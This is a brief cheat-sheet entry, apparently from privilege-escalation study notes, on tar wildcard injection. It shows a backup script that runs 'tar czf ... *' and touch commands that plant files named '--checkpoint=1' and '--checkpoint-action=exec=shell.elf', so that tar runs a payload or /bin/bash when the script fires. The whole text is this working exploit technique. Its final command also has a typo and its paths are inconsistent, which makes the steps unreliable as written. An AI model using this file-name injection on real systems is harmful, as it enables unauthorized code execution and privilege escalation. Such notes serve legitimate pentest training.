3. Wildcards 

#!/bin/bash
cd /home/usr
tar czf /tmp/backup.tar.gz * 

--checkpoint is the tar flag

So, create checkpoint first
#touch /home/user/--checkpoint=1
#touch /home/user/--checkpoint-action=exec=shell.elf (instead shell.elf you can change /bin/bash or whatever)

So,final command is like. ( we just inject the payload in the place of *(wild-card))
tar czf /tmp/backup.tar.gz --checkpoint=1 --checkpoint=action=shell.elf



